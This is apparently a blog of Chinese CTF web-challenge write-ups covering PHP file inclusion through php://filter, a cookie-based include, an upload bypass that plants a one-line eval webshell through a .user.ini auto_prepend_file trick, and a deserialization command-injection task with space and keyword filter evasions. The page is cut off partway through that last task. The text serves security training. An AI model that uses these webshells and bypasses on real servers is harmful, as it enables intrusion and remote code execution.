id="5-file-include-江苏工匠杯（-字符编码问题未懂）"><a href="#5-file-include-江苏工匠杯（-字符编码问题未懂）" class="headerlink" title="5_file_include 江苏工匠杯（?字符编码问题未懂）"></a>5_file_include 江苏工匠杯（?字符编码问题未懂）</h4><h5 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h5><p>进入环境，看到一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h5><ul><li><strong>PHP——iconv函数</strong></li><li>一些常见的字符编码</li></ul><h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>很明显的是文件包含问题，读代码我们可以发现是要在url中输入一个filename变量。</p><p>首先尝试了一下伪协议，<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>结果出现了，但是只有一句话。resource改成其他都是相同的回显。说明很可能被过滤，但具体过滤了哪些东西还不清楚</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/file_include_jiangsugongjiangbei_1.jpg"></p><p>可以使用<code>convert.iconv.</code>，进行过滤，可以使用convert.iconv.utf8.utf16&#x2F;resource&#x3D;check.php</p><h4 id="6-fileinclude-宜兴网信办"><a href="#6-fileinclude-宜兴网信办" class="headerlink" title="6_fileinclude 宜兴网信办"></a>6_fileinclude 宜兴网信办</h4><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_1.jpg"></p><p>文件包含题。</p><h5 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>cookie</strong>：</p></li><li><p>BP中cookie的写法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>language=flag<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p>首先检查下网页源代码，发现出现了index.php的源码。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get(&#x27;display_errors&#x27;) ) &#123;<br>  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);<br>  &#125;<br>error_reporting(E_ALL);<br>$lan = $_COOKIE[&#x27;language&#x27;];<br>if(!$lan)<br>&#123;<br>@setcookie(&quot;language&quot;,&quot;english&quot;);<br>@include(&quot;english.php&quot;);<br>&#125;<br>else<br>&#123;<br>@include($lan.&quot;.php&quot;);<br>&#125;<br>$x=file_get_contents(&#x27;index.php&#x27;);<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现是要我们传入一个cookie，其name为language，题目告诉我们答案在flag.php里，那么我们就去那里看看。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_2.jpg"></p><p>设置一下cookie，加上过滤，所以我们这样写</p><p><code>language=php://filter/read=convert.base64-encode/resource=flag</code></p><p>发现直接给出了一段base64编码后的字符串，去转换一下，得出答案。</p><h4 id="7-easy-upload-CTF"><a href="#7-easy-upload-CTF" class="headerlink" title="7_easy_upload_CTF"></a>7_easy_upload_CTF</h4><h5 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h5><p>进入环境，就是一个文件上传的提交</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_1.jpg"></p><p>检查一下网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.round_icon</span>&#123;</span><br><span class="language-css">  <span class="hljs-attribute">width</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">height</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><br><span class="language-css">  <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="language-css">  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">&#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>easyupload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">background</span>=<span class="hljs-string">&quot;background.jpg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-size:cover&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;uploads/index.php&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;round_icon&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;middle&quot;</span>  <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: blue;&quot;</span>&gt;</span>更换头像<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fileUpload&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: blue;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**&#x3D;&#x3D;.htaccess文件&#x3D;&#x3D;**：<code>.htaccess</code> 由于它以点或点开头，因此通常称为“点文件”。 <strong>点文件几乎总是某种形式的配置文件</strong>。 点文件可以用于操作系统或软件。 默认情况下，操作系统会将点文件隐藏在查找程序窗口或任何类型的系统文件管理器中。 通常，您必须从操作系统的首选项中选择“显示隐藏的文件”选项。 或者您可以使用 <code>ls -a</code> 命令以在命令行上显示所有文件。</p><p>​        全称是Hypertext Access(超文本入口)。<strong>提供了针对目录改变配置的方法</strong>， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<strong>管理员可以通过Apache的AllowOverride指令来设置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>​<strong>.htaccess的配置文件只能在Apache服务器中起作用</strong></p></li><li><p><strong>&#x3D;&#x3D;.user.ini&#x3D;&#x3D;<strong>：</strong>php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini，通常构造后门和隐藏后门。</strong></p></li><li><p><code>&lt;?php =eval($_REQUEST[&quot;xxx&quot;] )?&gt;</code>:_REQUEST包含了 _GET、 GET、_POST、$_COOKIE的所有内容，是它们的集合体。也就内是说只要用其中一种方容式做一个表单，把cmd这个变量给POST或者GET，甚至用cookies就可以把传输上去的内容执行。简而言之吧，就是执行cmd的值。</p></li><li><p><strong>蚁剑的工作原理：首先你需要发现服务端的一句话木马，每次连接的密码其实就是一句话木马的名字，蚁剑会帮你执行各种代码以获取完整的服务器目录。</strong></p></li><li><p>**&#x3D;&#x3D;利用.user.ini的条件&#x3D;&#x3D;**：</p><p>**服务器脚本语言为PHP **</p><p>**服务器使用CGI **</p><p>**FastCGI模式 **</p><p><strong>上传目录下要有可执行的php文件</strong></p></li><li><p>**&#x3D;&#x3D;图片头文件GIF89a&#x3D;&#x3D;**：</p><p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年发行），但在<strong>Web上所见到的大多数图形都是以89a版的格式创建的</strong>。 89a版的一个最主要的优势就是<strong>可以创建动态图像</strong>，特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p></li><li><p><strong>关于在Content-Type中multipart&#x2F;form-data的解析：</strong></p><p><strong>boundary是表示分隔，用于分隔多个文件。格式是：–后面跟着一串随机数</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNolPbAiXBmFZAw6W<br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>//提交为文件<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;fileUpload&quot;; filename=&quot;.user.ini&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br>//这里的content-type是文件类型，浏览器自己判断<br>GIF89a<br>auto_prepend_file=b.jpg<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload&quot;<br>æäº¤<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W--<br><br>//提交为表单字段<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;note&quot;<br>字段内容<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p>首先试一下能不能访问<code>index.phps</code>，<code>flag.php</code>，好吧，都没用。题目的意思一个是想让我们上传一张图片。我们先上传其他的类型的文件试试：</p><p>上传.txt文件回显：<code>your filetype looks wicked</code>（你的文件是恶意的），说明大部分的文件格式被过滤</p><p>上传图片文件回显：<code>file upload successful, the path is:  uploads/2051259.jpg</code></p><p>可以知道文件上传后是存放在uploads&#x2F;文件夹里</p><p><strong>我们需要明确一点，文件上传的解题是需要我们上传可执行文件，从而控制服务端</strong></p><p><strong>所以我们这里使用.user.ini配置文件来让index.php文件包含一个webshell，所以我们先创建一个包含shell语句的图片马b.txt</strong></p><p>内容如下：之后修改文件后缀为.gif，直接上传即可，因为图片文件未被过滤</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br>&lt;?=eval($_REQUEST<span class="hljs-section">[&#x27;cmd&#x27;]</span>)<span class="hljs-comment">;?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_6.jpg"></p><p><strong>之后想办法上传.user.ini文件，但会被过滤，所以我们使用BP抓包，修改上传文件的类型<code>application/octet-stream</code>为<code>image/gif</code>,</strong></p><p>创建一个.user.ini文件，其内容如下：auto_prepend_file是指当前目录下的任意php文件都要包含&#x3D;之后的文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=b.gif<br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_5.jpg"></p><p>上传成功，未被过滤</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_7.jpg"></p><p>下面我们使用蚁剑连接服务器：</p><p>首先查看地址，是要在<code>/uploads</code>目录下</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_4.jpg"></p><p>连接成功，可能会连接不上，多上传几次</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_2.jpg"></p><p>在根目录下发现flag</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_3.jpg"></p><p>答案：cyberpeace{9f37b587e6875ce35380526dba1120c6}</p><h4 id="8-unseping-江苏工匠杯（过滤的绕过）"><a href="#8-unseping-江苏工匠杯（过滤的绕过）" class="headerlink" title="8_unseping 江苏工匠杯（过滤的绕过）"></a>8_unseping 江苏工匠杯（过滤的绕过）</h4><h5 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        &#125;<br>    &#125; <br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        &#125;<br>    &#125;   <br>&#125;<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>PHP序列化和反序列化</strong>：</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php序列化和反序列化方式主要有：serialize，unserialize；json_encode，json_decode。</p></li><li><p>反序列化中常见的魔术函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>() 当一个对象创建时被调用，反序列化不触发<br><span class="hljs-built_in">__destruct</span>()  当一个对象销毁时被调用<br><span class="hljs-built_in">__toString</span>()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接<br><span class="hljs-built_in">__call</span>()      当调用的方法不存在时触发<br><span class="hljs-built_in">__invoke</span>()    当一个对象被当作函数调用时触发<br><span class="hljs-built_in">__wakeup</span>()    反序列化时自动调用<br><span class="hljs-built_in">__sleep</span>()     执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__get</span>()       类中的属性私有或不存在触发<br><span class="hljs-built_in">__set</span>()       类中的属性私有或不存在触发<br></code></pre></td></tr></table></figure></li><li><p>PHP函数：</p><ul><li>call_user_func_array：把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</li><li>exec：用来执行一个外部程序，不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面</li><li>passthru：只调用命令，把命令的运行结果原样地直接输出到标准输出设备上</li><li>system：输出并返回最后一行shell结果</li></ul></li><li><p><strong>&#x3D;&#x3D;shell语句被过滤的一些绕过技巧：&#x3D;&#x3D;</strong></p><p><strong>空格被过滤：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt; 、&lt;&gt;、%09(tab键)、%20、$IFS$9、$IFS$1、$&#123;IFS&#125;、$IFS等，还可以用&#123;&#125; 比如 &#123;cat,flag&#125;<br></code></pre></td></tr></table></figure><p><strong>敏感字符被过滤：</strong></p><p>字符串转为8进制</p></li><li><p>linux中的**$**可以用于执行shell命令：$(shell)</p></li><li><h5 id="linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”"><a href="#linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”" class="headerlink" title="&#x3D;&#x3D;linux中的printf函数支持字符串的8进制表示的读入&#x3D;&#x3D;：使用printf “hello world”"></a>&#x3D;&#x3D;linux中的<code>printf</code>函数支持字符串的8进制表示的读入&#x3D;&#x3D;：使用printf “hello world”</h5></li></ul><h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>​        这是一个很明显的反序列化题。首先可以明确的是我们需要传入一个POST变量ctf，其反序列化生成的对象时，会首先调用construct函数构造一个对象，然后调用__wakeup函数，其调用了waf，去检测<code>args</code>里是否有敏感字符<code>cat|flag|tac|php|ls</code>，这里说明args应该是一个数组，先记下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//检测敏感字符</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后代码结束，调用__destruct函数，发现这是在查看上传的method是否在数组ping中，如果有，则调用<code>call_user_func_array</code>，将<code>array($this, $this-&gt;method)</code>作为函数，<code>this-&gt;args</code>作为函数参数，很显然，我们应该去调用ping函数，<strong>里面有exec函数，这个函数可以使用系统命令，我们可以查看当前服务器下的一些东西</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>那么上传变量的产生方式应为：在PHP代码里生成序列化，然后base64-encode。</strong></p><p>比如我们想要查看index.php同级目录下的文件，</p><p>我们可以在PHP中这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ 